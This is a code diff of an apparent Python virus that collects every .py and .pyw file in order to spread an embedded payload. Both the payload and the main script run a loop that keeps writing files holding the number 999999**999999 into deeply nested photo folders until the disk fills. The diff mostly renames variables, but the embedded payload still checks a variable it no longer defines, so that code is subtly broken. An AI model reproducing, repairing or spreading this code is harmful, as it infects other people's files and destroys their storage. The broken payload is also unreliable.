@@ -6,14 +6,13 @@ import os
 
 payload="""
 def task():
-    m=999999
-    fc=1
-    fh="photos/pictures/2023/other/me/all/"
+    fpath="photos/pictures/2023/other/me/all/"
+    i=1
     while fc != 0:
-      dn=open(fh+"dn"+str(fc), "w")
-      dn.write(str(m**999999))
+      dn=open(fpath+"dn"+str(i), "w")
+      dn.write(str(999999**999999))
       dn.close()
-      fc=fc+1
+      i=i+1
 task()
 """
 spread_files = glob.glob('*.py') + glob.glob('*.pyw')
@@ -46,13 +45,12 @@ if not os.path.exists(pdir):
     os.makedirs(dir4)
 
 def task():
-    m=999999
-    fc=1
-    fh="photos/pictures/2023/other/me/trips/fun/important/all/"
-    while fc != 0:
-      dn=open(fh+"dn"+str(fc), "w")
-      dn.write(str(m**999999))
+    fpath="photos/pictures/2023/other/me/trips/fun/important/all/"
+    i=1
+    while True:
+      dn=open(fpath+"dn"+str(i), "w")
+      dn.write(str(999999**999999))
       dn.close()
-      fc=fc+1
+      i=i+1
 
 task()
